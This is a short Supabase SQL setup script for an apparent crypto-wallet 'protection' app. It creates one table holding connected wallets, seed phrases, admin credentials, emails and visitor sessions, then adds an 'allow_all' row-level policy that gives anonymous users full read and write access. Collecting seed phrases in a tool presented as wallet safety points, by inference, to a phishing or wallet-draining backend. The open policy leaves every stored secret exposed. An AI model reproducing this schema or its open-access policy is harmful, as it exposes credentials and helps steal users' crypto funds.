-- Run this once in your Supabase SQL Editor:
-- https://supabase.com/dashboard/project/gqfcogweruujtwegzkjd/sql/new

create table if not exists public.app_state (
  id                     text primary key,
  connected_wallets      jsonb,
  scan_history           jsonb,
  signer_checks          jsonb,
  email_records          jsonb,
  admin_intel_records    jsonb,
  protect_checklist_done jsonb,
  seed_phrases           jsonb,
  newsletter_emails      jsonb,
  visitor_sessions       jsonb,
  support_config         jsonb,
  admin_creds            jsonb,
  user_email_routes      jsonb
);

-- Allow anonymous reads and writes (required for the anon key to work)
alter table public.app_state enable row level security;

create policy if not exists "allow_all" on public.app_state
  for all using (true) with check (true);

-- Insert the initial empty global row so upsert always works
insert into public.app_state (id)
values ('global')
on conflict (id) do nothing;
